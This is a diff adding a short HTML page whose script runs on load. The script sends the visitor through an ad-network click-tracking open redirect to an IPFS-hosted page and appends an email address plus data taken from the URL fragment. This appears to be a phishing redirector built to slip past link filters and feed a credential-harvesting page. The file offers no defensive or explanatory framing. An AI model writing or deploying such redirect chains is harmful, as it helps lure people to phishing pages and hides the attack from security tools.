@@ -1,1 +1,35 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+</head>
+
+<body>
+
+    <script>
+        function redirrectPage() {
+            var query = window.location.href;
+            console.log(query);
+            var res = query.split("#");
+            var data1 = res[0];
+            var data2 = res[1];
+            console.log(data1);
+            console.log(data2);   
+            //data2 = atob(data2);
+
+            if (data2) {
+                console.log("true");
+                window.location.href = "https://secure.adnxs.com/clktrb?id=704169&redir=https://cloudflare-ipfs.com/ipfs/bafybeia2mgk7z3xpfu2vl2vxrswf3jpj6ixv73xnjkcih5v7ipcsq2wscu#chenTesting@yahoo.com#" + data2;
+            } else {
+                console.log("false");
+                window.location.href = "https://secure.adnxs.com/clktrb?id=704169&redir=https://cloudflare-ipfs.com/ipfs/bafybeia2mgk7z3xpfu2vl2vxrswf3jpj6ixv73xnjkcih5v7ipcsq2wscu#chenTesting@yahoo.com#";
+            }
+        }
+        redirrectPage();
+    </script>
+</body>
+
+</html>
+
+
 
